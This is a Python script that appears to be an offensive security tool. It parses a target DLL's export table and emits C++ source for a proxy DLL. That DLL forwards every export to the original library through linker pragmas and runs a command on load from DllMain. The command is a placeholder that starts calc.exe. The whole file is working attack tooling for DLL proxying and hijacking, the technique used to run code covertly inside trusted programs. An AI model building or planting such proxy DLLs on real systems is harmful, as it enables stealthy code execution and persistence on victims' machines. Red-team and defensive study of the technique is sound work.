import pereader, argparse, logging

from sys import exit
from os import path


class DLLProxyGenerator(object):
    PRE = """#pragma once
"""
    POST = """
#include <windows.h>
#include <string>

int run()
{
    std::wstring payload(TEXT("cmd.exe /C calc.exe"));

    STARTUPINFO info = { sizeof(info) };
    PROCESS_INFORMATION procInfo;
    CreateProcess(NULL, (wchar_t*)payload.c_str(), NULL, NULL, TRUE, CREATE_DEFAULT_ERROR_MODE, NULL, NULL, &info, &procInfo);

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        run();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
    """

    def __init__(self, dll, exports_only=False, target=None, output_path=None, overwrite=None):
        self.log = logging.getLogger('DLLProxyGenerator')
        self.orig_dll_filepath = path.abspath(dll)
        self.orig_dll_filename = path.split(self.orig_dll_filepath)[-1]

        if target:
            self.log.info(f"Replacing initial proxy target of \"{self.orig_dll_filename}\" with \"{target}\".")
            self.target_dll_export = target
        else:
            self.target_dll_export = self.orig_dll_filename

        self.target_dll_export = self.target_dll_export.replace("\\", "\\\\")

        self.output_path = output_path

        if self.output_path:
            self.init_output_file(overwrite)

        if not exports_only:
            self.print_pre()

        self.print_exports()

        if not exports_only:
            self.print_post()

        if self.output_path:
            self.log.info(f"Wrote generated code to \"{path.abspath(self.output_path)}\".")

    def print_exports(self):
        export_output = ""
        try:
            pe = pereader.PE(self.orig_dll_filepath)

            for exp in pe.directory_entry_export.symbols:
                export_output += f"#pragma comment(linker,\"" \
                                 f"/export:{exp.name}=\\\"{self.target_dll_export}\\\"" \
                                 f".{exp.name},@{exp.ordinal}\")\n"

            self.log.debug(f"Generated {len(pe.directory_entry_export.symbols.symbols)} export comment directives.")

            self.log.debug('Writing exports.')
            self.print_or_write(export_output)
            self.log.debug('Done writing exports.')

        except (FileNotFoundError, OSError) as e:
            self.log.critical(f"Unable to read target DLL \"{self.orig_dll_filepath}\", aborting.")
            self.log.debug(f"{e}")
            exit(1)

    def init_output_file(self, overwrite_output):
        if path.exists(self.output_path):
            if not overwrite_output:
                overwrite_user_input = None

                while overwrite_user_input != "y" and overwrite_user_input != "n":
                    overwrite_user_input = input(f"File \"{self.output_path}\" already exists. "
                                                 f"Overwrite? [Y/n] ").lower()
                    if not overwrite_user_input:
                        overwrite_user_input = "y"

                if overwrite_user_input != "y":
                    self.log.critical('Aborting.')
                    exit(1)
            else:
                self.log.debug(f"Automatically overwriting \"{path.abspath(self.output_path)}\"")

            try:
                open(self.output_path, 'w').close()
                self.log.debug(f"Cleared \"{self.output_path}\".")
            except OSError as e:
                self.log.critical(f"Unable to open \"{self.output_path}\" for writing.")
                self.log.debug(f"{e}")
                exit(1)

    def print_pre(self):
        self.log.debug('Writing PRE.')
        self.print_or_write(DLLProxyGenerator.PRE)
        self.log.debug('Done writing PRE.')

    def print_post(self):
        self.log.debug('Writing POST.')
        self.print_or_write(DLLProxyGenerator.POST)
        self.log.debug('Done writing POST.')

    def print_or_write(self, output):
        if self.output_path:
            try:
                with open(self.output_path, 'a') as fp:
                    fp.write(output)
                self.log.debug(f"Wrote {len(output.encode('utf-8'))} bytes to \"{path.abspath(self.output_path)}\".")
            except OSError as e:
                self.log.critical(f"Unable to open \"{self.output_path}\" for writing.")
                self.log.debug(f"{e}")
                exit(1)
        else:
            self.log.debug("Writing output to STDOUT")
            print(output)


def is_valid_file(parser, arg):
    if not path.exists(arg):
        parser.error(f"The file \"{arg}\" does not exist!")
    else:
        return arg


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Generates C++ code that can act as a proxy for a DLL target file..')

    parser.add_argument('dll', type=lambda x: is_valid_file(parser, x), help='DLL to pull exports from.')
    parser.add_argument('--exports-only', action='store_true',
                        help='Only generate C++ exports using the target DLL file.')
    parser.add_argument('-t', '--target', help='Override the DLL filepath that the proxy should target.')
    parser.add_argument('-o', '--output', help='Output C++ to file.')
    parser.add_argument('-w', '--overwrite', action='store_true', help='Automatically overwrite --output.')
    parser.add_argument('--debug', action='store_true', help='Print debug information.')

    args = parser.parse_args()

    # Setup logging
    if args.debug:
        logging_level = logging.DEBUG
    else:
        logging_level = logging.INFO

    logging.basicConfig(level=logging_level, format='%(asctime)s - %(name)s - %(levelname)s: %(message)s')
    logger = logging.getLogger('DLLProxyGenerator')

    DLLProxyGenerator(args.dll, exports_only=args.exports_only, target=args.target,
                      output_path=args.output, overwrite=args.overwrite)
